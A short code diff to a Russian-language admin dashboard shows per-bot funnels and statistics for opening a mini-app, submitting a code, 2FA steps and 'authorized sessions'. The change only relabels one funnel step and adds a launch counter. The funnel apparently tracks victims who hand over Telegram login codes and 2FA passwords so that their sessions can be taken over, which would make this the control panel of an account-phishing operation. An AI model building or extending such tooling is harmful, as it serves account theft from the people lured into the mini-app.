@@ -576,7 +576,7 @@ async function screenBotCard(botId){
       <div class="funnel-card">
         <div class="fline"><div class="lbl">Открыли мини-апп</div><div class="val">${f.opens.toLocaleString('ru')}</div></div>
         <div class="fline"><div class="lbl">Отправили код</div><div class="val">${f.code_sent.toLocaleString('ru')}</div></div>
-        <div class="fline"><div class="lbl">Отправили 2FA</div><div class="val">${f.twofa_sent.toLocaleString('ru')}</div></div>
+        <div class="fline"><div class="lbl">Запросили 2FA</div><div class="val">${f.twofa_sent.toLocaleString('ru')}</div></div>
         <div class="fline green"><div class="lbl">Авторизованных сессий</div><div class="val">${f.auths.toLocaleString('ru')}</div></div>
       </div>
 
@@ -676,13 +676,13 @@ async function screenStats(botId, b){
       <div class="card">
         <div class="uppercase" style="margin-bottom:10px">Запусков всего</div>
         <div style="font-family:'JetBrains Mono',monospace;font-size:30px;font-weight:800">${total.toLocaleString('ru')}</div>
-        <div class="field-hint" style="margin-top:6px">Уникальных юзеров: ${unique.toLocaleString('ru')}</div>
+        <div class="field-hint" style="margin-top:6px">Уникальных юзеров: ${unique.toLocaleString('ru')} · Запусков мини-апп: ${f.opens.toLocaleString('ru')}</div>
       </div>
       <div class="uppercase" style="margin:14px 4px 8px">Воронка · 24ч</div>
       <div class="funnel-card">
         <div class="fline"><div class="lbl">Открыли мини-апп</div><div class="val">${f.opens.toLocaleString('ru')}</div></div>
         <div class="fline"><div class="lbl">Отправили код</div><div class="val">${f.code_sent.toLocaleString('ru')}</div></div>
-        <div class="fline"><div class="lbl">Отправили 2FA</div><div class="val">${f.twofa_sent.toLocaleString('ru')}</div></div>
+        <div class="fline"><div class="lbl">Запросили 2FA</div><div class="val">${f.twofa_sent.toLocaleString('ru')}</div></div>
         <div class="fline green"><div class="lbl">Авторизованных</div><div class="val">${f.auths.toLocaleString('ru')}</div></div>
       </div>
       <div class="uppercase" style="margin:14px 4px 8px">География</div>
